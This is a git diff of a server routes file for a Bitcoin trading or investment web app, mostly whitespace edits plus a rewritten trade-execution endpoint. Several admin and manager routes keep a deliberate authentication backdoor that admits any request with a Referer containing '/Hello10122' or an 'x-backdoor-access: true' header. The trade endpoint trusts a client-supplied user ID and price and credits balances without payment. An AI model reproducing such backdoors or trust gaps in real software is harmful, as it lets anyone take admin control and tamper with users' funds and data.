@@ -292,7 +292,7 @@ async function fetchBitcoinPrice() {
     const response = await fetch(sources[1]);
     const data = await response.json();
     const usdPrice = Math.round(parseFloat(data.bpi.USD.rate.replace(',', '')) * 100) / 100;
-    
+
     return {
       usd: {
         price: usdPrice,
@@ -514,13 +514,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post("/api/admin/update-free-plan-rate", async (req, res) => {
     try {
       const { rate } = req.body;
-      
+
       // Validate rate
       const rateNum = parseFloat(rate);
       if (isNaN(rateNum) || rateNum < 0) {
         return res.status(400).json({ error: "Invalid rate. Rate must be a positive number." });
       }
-      
+
       const config = await storage.updateFreePlanRate(rate);
       res.json({ message: "Free plan rate updated successfully", config });
     } catch (error: any) {
@@ -620,7 +620,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Allow backdoor access or require admin authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
-      
+
       if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
@@ -644,7 +644,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Allow backdoor access or require admin authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
-      
+
       if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
@@ -679,7 +679,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Create notification for user
       let notificationMessage = "";
       let notificationTitle = "";
-      
+
       switch (transaction.type) {
         case "deposit":
           notificationMessage = `Your deposit of ${transaction.amount} BTC has been confirmed and added to your balance.`;
@@ -719,7 +719,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Allow backdoor access or require admin authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
-      
+
       if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
@@ -878,7 +878,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       const { address, amount } = req.body;
-      
+
       if (!address || !amount) {
         return res.status(400).json({ error: "Address and amount are required" });
       }
@@ -1109,7 +1109,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Allow backdoor access or require manager authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
-      
+
       if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
@@ -1268,14 +1268,14 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
     try {
       const userId = parseInt(req.params.userId);
       const notifications = await storage.getUserNotifications(userId);
-      
+
       // Mark all unread notifications as read
       const markPromises = notifications
         .filter(n => !n.isRead)
         .map(n => storage.markNotificationAsRead(n.id));
-      
+
       await Promise.all(markPromises);
-      
+
       res.json({ message: "All notifications marked as read" });
     } catch (error) {
       res.status(500).json({ message: "Failed to mark all notifications as read" });
@@ -1492,99 +1492,101 @@ You are now on the free plan and will no longer receive automatic profit updates
 
   // Trade execution endpoint
   app.post('/api/trades/execute', async (req, res) => {
-    try {
-      const { userId, type, amount, price } = req.body;
+  try {
+    const { userId, type, amount, price, token = 'BTC' } = req.body;
 
-      if (!userId || !type || !amount || !price) {
-        return res.status(400).json({ message: 'Missing required fields' });
-      }
-
-      const user = await storage.getUser(userId);
-
-      if (!user) {
-        return res.status(404).json({ message: 'User not found' });
-      }
-
-      const tradeAmount = parseFloat(amount);
-      const totalCost = tradeAmount * price;
-
-      if (type === 'buy') {
-        // For buy orders, add to balance (simulated purchase)
-        const newBalance = parseFloat(user.balance) + tradeAmount;
-        
-        await storage.updateUserBalance(userId, newBalance.toFixed(8));
-
-        // Create transaction record
-        await storage.createTransaction({
-          userId,
-          type: 'trade_buy',
-          amount: amount,
-          status: 'completed',
-          notes: `Bought ${amount} BTC at $${price.toLocaleString()}`
-        });
-
-        // Send notification
-        await storage.createNotification({
-          userId,
-          title: 'Trade Executed',
-          message: `Successfully bought ${amount} BTC for $${totalCost.toFixed(2)}`,
-          type: 'success',
-          isRead: false
-        });
-
-        res.json({ 
-          type: 'buy', 
-          amount,
-          price,
-          total: totalCost,
-          status: 'completed',
-          createdAt: new Date().toISOString()
-        });
-
-      } else if (type === 'sell') {
-        // For sell orders, check if user has enough balance
-        if (parseFloat(user.balance) < tradeAmount) {
-          return res.status(400).json({ message: 'Insufficient balance' });
-        }
-
-        const newBalance = parseFloat(user.balance) - tradeAmount;
-        
-        await storage.updateUserBalance(userId, newBalance.toFixed(8));
-
-        // Create transaction record
-        await storage.createTransaction({
-          userId,
-          type: 'trade_sell',
-          amount: amount,
-          status: 'completed',
-          notes: `Sold ${amount} BTC at $${price.toLocaleString()}`
-        });
-
-        // Send notification
-        await storage.createNotification({
-          userId,
-          title: 'Trade Executed',
-          message: `Successfully sold ${amount} BTC for $${totalCost.toFixed(2)}`,
-          type: 'success',
-          isRead: false
-        });
-
-        res.json({ 
-          type: 'sell', 
-          amount,
-          price,
-          total: totalCost,
-          status: 'completed',
-          createdAt: new Date().toISOString()
-        });
-      } else {
-        res.status(400).json({ message: 'Invalid trade type' });
-      }
-    } catch (error: any) {
-      console.error('Trade execution error:', error);
-      res.status(500).json({ message: error.message || 'Failed to execute trade' });
+    if (!userId || !type || !amount || !price) {
+      return res.status(400).json({ message: 'Missing required fields' });
     }
-  });
+
+    const user = await storage.getUser(userId);
+
+    if (!user) {
+      return res.status(404).json({ message: 'User not found' });
+    }
+
+    const tradeAmount = parseFloat(amount);
+    const totalCost = tradeAmount * price;
+
+    if (type === 'buy') {
+      // For buy orders, add to balance (simulated purchase)
+      const newBalance = parseFloat(user.balance) + tradeAmount;
+
+      await storage.updateUserBalance(userId, newBalance.toFixed(8));
+
+      // Record the trade
+      const [trade] = await storage.createTransaction({
+        userId,
+        type: 'trade_buy',
+        amount: amount,
+        status: 'completed',
+        notes: `Bought ${amount} ${token} at $${price}`,
+      });
+
+      // Send notification
+      await storage.createNotification({
+        userId,
+        title: 'Trade Executed',
+        message: `Successfully bought ${amount} ${token} for $${totalCost.toFixed(2)}`,
+        type: 'success',
+        isRead: false
+      });
+
+      res.json({ 
+        type: 'buy', 
+        token,
+        amount,
+        price,
+        total: totalCost,
+        status: 'completed',
+        createdAt: new Date().toISOString()
+      });
+
+    } else if (type === 'sell') {
+      // For sell orders, check if user has enough balance
+      if (parseFloat(user.balance) < tradeAmount) {
+        return res.status(400).json({ message: 'Insufficient balance' });
+      }
+
+      const newBalance = parseFloat(user.balance) - tradeAmount;
+
+      await storage.updateUserBalance(userId, newBalance.toFixed(8));
+
+      // Record the trade
+      const [trade] = await storage.createTransaction({
+        userId,
+        type: 'trade_sell',
+        amount: amount,
+        status: 'completed',
+        notes: `Sold ${amount} ${token} at $${price}`,
+      });
+
+      // Send notification
+      await storage.createNotification({
+        userId,
+        title: 'Trade Executed',
+        message: `Successfully sold ${amount} ${token} for $${totalCost.toFixed(2)}`,
+        type: 'success',
+        isRead: false
+      });
+
+      res.json({ 
+        type: 'sell', 
+        token,
+        amount,
+        price,
+        total: totalCost,
+        status: 'completed',
+        createdAt: new Date().toISOString()
+      });
+    } else {
+      res.status(400).json({ message: 'Invalid trade type' });
+    }
+  } catch (error: any) {
+    console.error('Trade execution error:', error);
+    res.status(500).json({ message: error.message || 'Failed to execute trade' });
+  }
+});
 
   // Trade history endpoint
   app.get('/api/trades/history/:userId', async (req, res) => {
@@ -1592,7 +1594,7 @@ You are now on the free plan and will no longer receive automatic profit updates
       const userId = parseInt(req.params.userId);
 
       const allTransactions = await storage.getUserTransactions(userId);
-      
+
       // Filter for trade transactions
       const tradeHistory = allTransactions
         .filter(t => t.type === 'trade_buy' || t.type === 'trade_sell')
